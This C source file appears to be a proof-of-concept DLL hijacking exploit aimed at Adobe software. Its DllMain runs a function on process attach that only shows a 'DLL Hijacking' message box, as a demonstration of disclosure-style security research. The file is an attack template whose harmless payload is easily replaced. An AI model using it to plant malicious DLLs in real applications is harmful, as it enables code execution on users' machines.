#include <windows.h>

BOOL WINAPI DllMain (
            HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
{
    switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		dll_hijack();
	case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
	break;
	}
	return TRUE;
}

int dll_hijack()
{
  MessageBox(0, "Adobe DLL Hijacking!", "DLL Message", MB_OK);
}

